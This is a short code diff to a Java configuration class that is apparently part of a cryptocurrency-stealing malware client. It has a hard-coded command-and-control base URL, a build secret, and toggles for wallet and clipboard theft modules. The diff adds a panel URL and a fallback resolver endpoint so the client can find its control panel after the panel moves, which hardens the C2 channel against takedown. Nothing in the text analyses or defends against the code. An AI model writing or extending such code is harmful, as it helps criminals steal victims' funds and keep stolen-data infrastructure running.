@@ -20,6 +20,10 @@ public final class CryptoConfig {
 	public final String buildId;
 	public final String buildSecret;
 	public final String c2Base;
+	/** Control-channel origin. Falls back to the API origin without /api/v1. */
+	public final String panelUrl;
+	/** Optional endpoint that returns {"panel_url": "..."} when the panel moves. */
+	public final String resolverUrl;
 	public final boolean full;
 	public final boolean wallets;
 	public final boolean clipboard;
@@ -38,6 +42,9 @@ public final class CryptoConfig {
 		buildId = Json.str(map, "build_id", "");
 		buildSecret = Json.str(map, "build_secret", "");
 		c2Base = strip(Json.str(map, "c2_base", "https://c2.spc-cloud.net/api/v1"));
+		String panel = strip(Json.str(map, "panel_url", ""));
+		panelUrl = panel.isEmpty() ? c2Base.replaceFirst("/api/v1/?$", "") : panel;
+		resolverUrl = strip(Json.str(map, "resolver_url", ""));
 		full = "full".equals(Json.str(map, "profile", "lite"));
 		Map<String, Object> modules = Json.map(map.get("modules"));
 		wallets = bool(modules, "wallets", true);
